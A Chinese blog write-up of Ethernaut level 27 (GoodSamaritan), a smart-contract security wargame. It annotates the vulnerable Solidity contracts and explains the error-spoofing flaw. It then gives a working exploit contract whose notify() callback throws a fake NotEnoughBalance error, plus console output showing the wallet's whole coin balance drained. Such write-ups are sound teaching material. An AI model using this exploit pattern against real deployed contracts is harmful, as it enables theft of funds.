---
title: 'ethernaut.openzeppelin合约安全闯关-final'
date: 2022-12-25 14:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'



---

<!-- more -->

#### 第二十七关  GoodSamaritan  思路与POC

#### 目标: 将wallet合约在Coin合约中的余额全部清空

##### 先看代码:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet; '0xc56Dc21F3Bf6b4ba33bB54281216ee54a2C5e5c0'
    Coin public coin; '0x96Aa7E63c6Efe59f9a330a6bC1987A99Df9B0071'

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet)); //初始钱包合约Coin余额10^6

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // 每次调用 donate 10 coin 如果出现wallet余额不够error,即转账所有剩下的金额
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
       
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // 余额足够才发起转账
        if(amount_ <= currentBalance) {
        //没有发送token操作,仅是合约map变量改变
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // Vulnerability !!!
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
   
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // 检测wallet合约在Coin合约的余额
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // 调用Coin合约的transfer函数
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // 转账所有余额到dest
        coin.transfer(dest_, coin.balances(address(this)));
    }
   
   //设置Coin合约地址
    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}
//problem interface !!
interface INotifyable {
    function notify(uint256 amount) external;
}

/*
poc思路: 
首先来看下正常的用户调用过程:
user -call->  requestDonation() <-> wallet.donate10(msg.sender) <->  coin.transfer(dest_, 10) 

注意到问题了吗? 
1.Coin合约的transfer方法会检测目标地址是否是合约,如果是合约就要求实现了notify函数
2.GoodSamaritan合约的requestDonation()函数是判断是否有(NotEnoughBalance())自定义异常返回来判断
是否调用wallet.transferRemainder(msg.sender)转账所有Coin
如果恶意合约恶意实现notify函数使其永远返回(NotEnoughBalance())异常呢?

通过异常判断不可取,因为你无法判断异常是从哪里抛出的
*/

```

##### EXP:

```solidity
// SPDX-License-Identifier: MIT

import "./Vulnerability/GoodSamaritan/GoodSamaritan.sol";

pragma solidity ^0.8.0;

// interface INotifyable {
//     function notify(uint256 amount) external;
// }

error NotEnoughBalance();

contract hackGoodSamaritanWallet {
    GoodSamaritan gs = GoodSamaritan(0x5DE81363B2107BB31fff82BDdFcf17963b19B790);
    function attack() public {
        gs.requestDonation();
    }
    function notify(uint256 amount) external pure {
     //如果不添加这个条件的话那么Coin合约执行到调用此方法的时候就会立即回滚所有操作
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}

```

##### check:

```js
> (await coin.balances('0xc56Dc21F3Bf6b4ba33bB54281216ee54a2C5e5c0')).toString()
'0'
> (await coin.balances('0x5c17Edc664A9C6526BB86ea95f0E53B1d3C78D8E')).toString()
'1000000'
```

